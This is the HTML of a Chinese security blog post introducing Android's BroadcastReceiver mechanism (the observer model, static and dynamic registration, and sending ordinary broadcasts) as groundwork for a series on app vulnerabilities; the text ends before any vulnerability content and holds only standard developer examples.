<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"security-kitchen.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.json"};
  </script>

  <meta name="description" content="一、前言今天继续总结Android APP漏洞四大组件中Broadcast Recevier漏洞挖掘的知识，主要分为两个部分，一部分对Android 广播机制原理作一个初步的总结，另一部分便是对Android 广播机制常见的一些漏洞进行总结，主要是介绍一些已存在的典型漏洞，部分知识可以参考前两篇帖子Android APP漏洞之战（2）——Service漏洞挖掘详解和Android APP漏洞之战（">
<meta property="og:type" content="article">
<meta property="og:title" content="Android App漏洞之战（11）——Broadcast Recevier漏洞详解">
<meta property="og:url" content="http://security-kitchen.com/2023/02/13/bug0011/index.html">
<meta property="og:site_name" content="欢迎来到安全后厨！">
<meta property="og:description" content="一、前言今天继续总结Android APP漏洞四大组件中Broadcast Recevier漏洞挖掘的知识，主要分为两个部分，一部分对Android 广播机制原理作一个初步的总结，另一部分便是对Android 广播机制常见的一些漏洞进行总结，主要是介绍一些已存在的典型漏洞，部分知识可以参考前两篇帖子Android APP漏洞之战（2）——Service漏洞挖掘详解和Android APP漏洞之战（">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/1.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/2.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/4.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/5.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/6.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/7.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/8.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/9.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/10.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/11.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/12.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/13.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/14.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/15.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/16.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/17.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/18.png">
<meta property="article:published_time" content="2023-02-13T01:03:19.000Z">
<meta property="article:modified_time" content="2023-12-23T09:13:44.111Z">
<meta property="article:author" content="安全后厨团队">
<meta property="article:tag" content="漏洞挖掘">
<meta property="article:tag" content="工具">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/1.png">

<link rel="canonical" href="http://security-kitchen.com/2023/02/13/bug0011/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Android App漏洞之战（11）——Broadcast Recevier漏洞详解 | 欢迎来到安全后厨！</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="欢迎来到安全后厨！" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>
	<div class="headband"></div>
    <a target="_blank" rel="noopener" href="https://github.com/WindXaa?tab=repositories" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">欢迎来到安全后厨！</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-resources">

    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://security-kitchen.com/2023/02/13/bug0011/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="安全后厨团队">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欢迎来到安全后厨！">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Android App漏洞之战（11）——Broadcast Recevier漏洞详解
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-13 09:03:19" itemprop="dateCreated datePublished" datetime="2023-02-13T09:03:19+08:00">2023-02-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-12-23 17:13:44" itemprop="dateModified" datetime="2023-12-23T17:13:44+08:00">2023-12-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/" itemprop="url" rel="index"><span itemprop="name">Android APP漏洞之战</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>今天继续总结Android APP漏洞四大组件中Broadcast Recevier漏洞挖掘的知识，主要分为两个部分，一部分对Android 广播机制原理作一个初步的总结，另一部分便是对Android 广播机制常见的一些漏洞进行总结，主要是介绍一些已存在的典型漏洞，部分知识可以参考前两篇帖子<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269255.htm">Android APP漏洞之战（2）——Service漏洞挖掘详解</a>和<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269211.htm">Android APP漏洞之战（1）——Activity漏洞挖掘详解</a>。</p>
<span id="more"></span>
<h2 id="二、Broadcast-Recevier初步介绍"><a href="#二、Broadcast-Recevier初步介绍" class="headerlink" title="二、Broadcast Recevier初步介绍"></a>二、Broadcast Recevier初步介绍</h2><h3 id="1-Broadcast-Recevier的基本原理"><a href="#1-Broadcast-Recevier的基本原理" class="headerlink" title="1.Broadcast Recevier的基本原理"></a>1.Broadcast Recevier的基本原理</h3><h3 id="（1）广播机制简介"><a href="#（1）广播机制简介" class="headerlink" title="（1）广播机制简介"></a>（1）广播机制简介</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android中的每个应用程序都可以对自己感兴趣的广播进行注册，这样该程序只会收到自己所关心的广播内容，这些广播可以是来自系统的，也可能是来自其他程序的。Android提供了一套完整的API,允许应用程序自由地发送和接收广播。</span><br><span class="line">   广播机制分为两个方面：广播发送者和广播接收者，一般来说，BroadcastReceiver就是广播接收者。     </span><br></pre></td></tr></table></figure>

<h3 id="（2）广播机制应用场景"><a href="#（2）广播机制应用场景" class="headerlink" title="（2）广播机制应用场景"></a>（2）广播机制应用场景</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）Android内不同组件间的通信（应用/不同应用之间）</span><br><span class="line">（<span class="number">2</span>）多线程通信</span><br><span class="line">（<span class="number">3</span>）与Android系统在特定情况下的通信</span><br></pre></td></tr></table></figure>

<h3 id="（3）广播机制模型理解"><a href="#（3）广播机制模型理解" class="headerlink" title="（3）广播机制模型理解"></a>（3）广播机制模型理解</h3><p>Android的广播机制使用了设计模式中的观察者模式：基于消息的发布&#x2F;订阅事件模型，<code>从设计模式上讲，广播的发送者和接收者极大程度的**解耦**，使得系统方便集成，容易扩展</code>。</p>
<p>模型中的3个基本角色：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）消息订阅者（广播接收者）</span><br><span class="line">（<span class="number">2</span>）消息发布者（广播发布者）</span><br><span class="line">（<span class="number">3</span>）消息中心（AMS,即Activity Manager Service）</span><br></pre></td></tr></table></figure>

<p>模型的具体原理如下图所示：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/1.png"></p>
<h3 id="（4）广播机制的使用流程"><a href="#（4）广播机制的使用流程" class="headerlink" title="（4）广播机制的使用流程"></a>（4）广播机制的使用流程</h3><p>我们先通过一个流程图来具体的理解广播机制的运行原理：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/2.png" alt="image-20210912150855995"></p>
<p>具体的操作流程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）首先开发人员自定义广播接收者BroadcastReceiver，并重写onRecvice()方法，在里面可以实现具体操作，然后到消息中心AMS注册</span><br><span class="line">（<span class="number">2</span>）广播发送者定义并向AMS发送广播</span><br><span class="line">（<span class="number">3</span>）AMS查找符合相应条件（IntentFilter/Permission等）的BroadcastReceiver</span><br><span class="line">（<span class="number">4</span>）AMS将广播发送到上述符合条件的BroadcastReceiver相应的消息循环队列中</span><br><span class="line">（<span class="number">5</span>）BroadcastReceiver通过消息循环执行拿到此广播，回调BroadcastReceiver中的onReceive()方法。</span><br></pre></td></tr></table></figure>

<p>我们可以按照流程图具体一步步来实现广播机制：</p>
<p><strong>&lt;1&gt;自定义广播接收者BroadcastReceiver：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 继承BroadcastReceivre类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">mBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 复写onReceive()方法</span></span><br><span class="line">  <span class="comment">// 接收到广播后，则自动调用该方法</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">   <span class="comment">//写入接收广播后的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">操作步骤：</span><br><span class="line">（<span class="number">1</span>）继承BroadcastReceivre基类</span><br><span class="line">（<span class="number">2</span>）必须复写抽象方法onReceive()方法</span><br><span class="line">	广播接收器接收到相应广播后，会自动回调 onReceive() 方法，一般情况下，onReceive方法会涉及 与 其他组件之间的交互，如发送Notification、启动Service等，默认情况下，广播接收器运行在 UI 线程，因此，onReceive()方法不能执行耗时操作，否则将导致ANR</span><br></pre></td></tr></table></figure>

<p><strong>&lt;2&gt;广播接收者注册：</strong></p>
<p>注册的方式分为两种：静态注册、动态注册</p>
<p><strong>静态注册：</strong></p>
<p>注册方式：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在AndroidManifest.xml里通过&lt;receive&gt;标签声明</span><br></pre></td></tr></table></figure>

<p>属性说明：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">[</span>&quot;<span class="attr">true</span>&quot; | &quot;<span class="attr">false</span>&quot;]</span></span><br><span class="line"><span class="tag">//<span class="attr">此broadcastReceiver能否接收其他App的发出的广播</span></span></span><br><span class="line"><span class="tag">//<span class="attr">默认值是由receiver中有无intent-filter决定的</span>：<span class="attr">如果有intent-filter</span>，<span class="attr">默认值为true</span>，<span class="attr">否则为false</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">[</span>&quot;<span class="attr">true</span>&quot; | &quot;<span class="attr">false</span>&quot;]</span></span><br><span class="line"><span class="tag">    <span class="attr">android:icon</span>=<span class="string">&quot;drawable resource&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">//<span class="attr">继承BroadcastReceiver子类的类名</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">//<span class="attr">具有相应权限的广播发送者发送的广播才能被此BroadcastReceiver所接收</span>；</span></span><br><span class="line"><span class="tag">    <span class="attr">android:permission</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">//<span class="attr">BroadcastReceiver运行所处的进程</span></span></span><br><span class="line"><span class="tag">//<span class="attr">默认为app的进程</span>，<span class="attr">可以指定独立的进程</span></span></span><br><span class="line"><span class="tag">//<span class="attr">注</span>：<span class="attr">Android四大基本组件都可以通过此属性指定自己的独立进程</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:process</span>=<span class="string">&quot;string&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line">//用于指定此广播接收器将接收的广播类型</span><br><span class="line">//本示例中给出的是用于接收网络状态改变时发出的广播</span><br><span class="line"> <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>具体实例：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> </span></span><br><span class="line"><span class="tag">    //<span class="attr">此广播接收者类是mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //用于接收网络状态改变时发出的广播</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们完成静态注册后，当App首次启动时，系统会自动实例化mBroadcastReceiver类，并注册到系统中</p>
<p><strong>动态注册：</strong></p>
<p>注册方式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态注册需要在功能代码中进行注册</span><br></pre></td></tr></table></figure>

<p>具体实例：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/4.png" alt="image-20210912150855995"></p>
<p>具体实现步骤：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）实例化自定义的广播接收者，我们实现广播的功能，可以继承BroadcastReceiver类，并重写类中的方法</span><br><span class="line">（<span class="number">2</span>）实例化意图过滤器，并设置要过滤的广播类型</span><br><span class="line">（<span class="number">3</span>）使用Context的registerReceiver(BroadcastReceiver,IntentFilter)方法注册广播</span><br><span class="line">（<span class="number">4</span>）在onDestory()方法中通过调用unregisterReceiver()方法来实现取消注册</span><br></pre></td></tr></table></figure>

<p>注意事项：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注意：动态广播最好在Activity的onResume()注册、onPause()注销</span><br><span class="line">原因：</span><br><span class="line">	<span class="number">1.</span>对于动态广播，有注册就必然得有注销，否则会导致内存泄露</span><br><span class="line">	<span class="number">2.</span>Activity生命周期如下都是成对出现的 onCreate() &amp; onDestory()、onStart() &amp; onStop()、onResume() &amp; onPause()</span><br><span class="line"></span><br><span class="line">在onResume()注册、onPause()注销是因为onPause()在App死亡前一定会被执行，从而保证广播在App死亡前一定会被注销，从而防止内存泄露。</span><br><span class="line">（<span class="number">1</span>）不在onCreate() &amp; onDestory() 或 onStart() &amp; onStop()注册、注销是因为：当系统因为内存不足（优先级更高的应用需要内存，请看上图红框）要回收Activity占用的资源时，Activity在执行完onPause()方法后就会被销毁，有些生命周期方法onStop()，onDestory()就不会执行。当再回到此Activity时，是从onCreate方法开始执行。</span><br><span class="line">（<span class="number">2</span>）假设我们将广播的注销放在onStop()，onDestory()方法里的话，有可能在Activity被销毁后还未执行onStop()，onDestory()方法，即广播仍还未注销，从而导致内存泄露。</span><br><span class="line">（<span class="number">3</span>）但是，onPause()一定会被执行，从而保证了广播在App死亡前一定会被注销，从而防止内存泄露。</span><br></pre></td></tr></table></figure>

<p><strong>两种注册方式的对比：</strong></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/5.png" alt="image-20210912150855995"></p>
<p>这里我们就完成了广播接收者的基本工作</p>
<p><strong>&lt;3&gt;广播发送者定义和发送广播：</strong></p>
<p><strong>广播的发送：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）广播 是 用意图（Intent）标识</span><br><span class="line">（<span class="number">2</span>）定义广播的本质 = 定义广播所具备的“意图（Intent）</span><br><span class="line">（<span class="number">3</span>）广播发送 = 广播发送者 将此广播的“意图（Intent）”通过sendBroadcast（）方法发送出去</span><br></pre></td></tr></table></figure>

<p><strong>广播的类型：</strong></p>
<p>第一种分类：</p>
<p>广播接收器一般可以分为两种类型：标准广播和有序广播</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">标准广播：一种完全异步执行的广播，广播发出之后，所有的广播接收器都会在同一时刻接收这条广播信息，广播效率比较高，同时是无法截断的。</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/6.png" alt="image-20210912150855995"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有序广播：是一种同步执行的广播，在广播发出之后，同一时刻会有一个广播接收器能收到这条广播消息，当这个广播接收器中逻辑执行完毕后，广播才会继续传递。</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/7.png" alt="image-20210912150855995"></p>
<p>第二种分类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">广播的类型主要分为<span class="number">5</span>类：</span><br><span class="line">	（<span class="number">1</span>）普通广播</span><br><span class="line">	（<span class="number">2</span>）系统广播</span><br><span class="line">	（<span class="number">3</span>）有序广播</span><br><span class="line">	（<span class="number">4</span>）粘性广播</span><br><span class="line">	（<span class="number">5</span>）App应用内广播</span><br></pre></td></tr></table></figure>

<p><strong>普通广播：</strong></p>
<p>开发者自身定义intent的广播（最常用），发送广播使用如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="comment">//对应BroadcastReceiver中intentFilter的action</span></span><br><span class="line">intent.setAction(<span class="string">&quot;BROADCAST_ACTION&quot;</span>);</span><br><span class="line"><span class="comment">//发送广播</span></span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>

<p>若被注册了的广播接收者中注册时intentFilter的action与上述匹配，则会接收此广播（即进行回调onReceive()）,如下mBroadcastReceiver则会接收上述广播</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> </span></span><br><span class="line"><span class="tag">    //<span class="attr">此广播接收者类是mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //用于接收网络状态改变时发出的广播</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;BROADCAST_ACTION&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果发送的广播有对应权限，那么广播接收者也需要对应权限</p>
<p><strong>系统广播：</strong></p>
<p>Android中内置了多个系统广播：只要涉及到手机的基本操作（如开机、网络状态变化、拍照等），都会发送相应的广播每个广播都有特定的Intent-Filter(包括具体的action)，Android系统广播action如下：</p>
